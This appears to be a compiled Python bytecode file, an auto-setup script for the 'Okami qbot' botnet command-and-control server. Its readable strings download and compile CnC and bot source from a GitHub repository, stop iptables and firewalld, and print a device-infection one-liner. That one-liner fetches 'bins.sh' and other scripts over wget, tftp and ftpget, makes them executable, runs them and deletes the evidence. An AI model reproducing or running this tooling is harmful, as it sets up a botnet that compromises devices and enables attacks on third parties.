ó
ÀNàac           @   sE  d  d l  Z  d   Z d   Z d GHe d  Z e d  Z e d  Z e d  Z e d	  Z d
 GHe d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  e d  d! d" e d# e d$  e d% e d& e d'  e d( e d)  e d* e d+ e d)  e d,  e d-  e d  e d.  d/ GHd0 e d1 e d2 e d3 e d4 GHd5 e d6 GHd S(7   iÿÿÿÿNc         C   s   t  j |  d t d  S(   Nt   shell(   t
   subprocesst   callt   True(   t   cmd(    (    s   auto-setup.pyt   command   s    c         C   sI   t  |  d  j   } | | | <t  |  d  } | j |  | j   d  S(   Nt   rt   w(   t   opent	   readlinest
   writelinest   close(   t	   file_namet   line_numt   textt   linest   out(    (    s   auto-setup.pyt   add   s
    
sX   [1;37m[[1;35mOkami qbot[1;37m] [1;37mCnC AutoSetup 
Developed By [1;35mReload#9575 s#   [1;37mEnter Your Server IP:[1;35ms%   [1;37mEnter Desired Username:[1;35ms%   [1;37mEnter Desired Password:[1;35ms$   [1;37mEnter Desired BotPort:[1;35ms3   [1;37mEnter The Port You Want to screen on:[1;35ms.   [1;35mInstalling Needed Dependencies..[1;37ms   yum update -ysG   yum install python-paramiko gcc screen nano wget httpd iptables perl -ysI   yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -ys`   yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -ys   yum install epel-release -ys   yum install gengetopt -ys   yum install bzip2 -ys   yum install screen -ysc   wget -q https://raw.githubusercontent.com/Reload-astro/kfoalsnebvyaskne/main/nokill.py -O nokill.pys   python nokill.pys[   wget -q https://raw.githubusercontent.com/Reload-astro/kfoalsnebvyaskne/main/cnc.c -O cnc.cs   gcc cnc.c -o cnc -pthreads   rm -rf cnc.cs_   wget -q https://raw.githubusercontent.com/Reload-astro/kfoalsnebvyaskne/main/Okami.c -O Okami.csa   wget -q https://raw.githubusercontent.com/Reload-astro/kfoalsnebvyaskne/main/Okami.py -O Okami.pys   service iptabes stops   service httpd restarts   systemctl stop firewallds   httpd -k restarts   httpd -krestarts   pkill screens   Okami.ci3   s!   unsigned char *commServer[] = { "t   :s   " };
s   echo t    s    >> login.txts   python Okami.py Okami.c t    s   screen ./cnc s    1 s   rm -rf Okami.cs   rm -rf Okami.pys   rm -rf nokill.pys   [1;37mWget/CHARLINE Below!sJ   [0;32mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://s.   /bins.sh; chmod 777 bins.sh; sh bins.sh; tftp sG    -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g sM   ; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 sD    ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *[0ms   [1;37mThank you [[1;35msH   [1;37m] for using the [1;37m[[1;35mAstro[1;37m] [1;37mCnC AutoSetup(	   R   R   R   t	   raw_inputt   ipt   usert   passwt   bportt   port(    (    (    s   auto-setup.pyt   <module>   s`   		



























 



%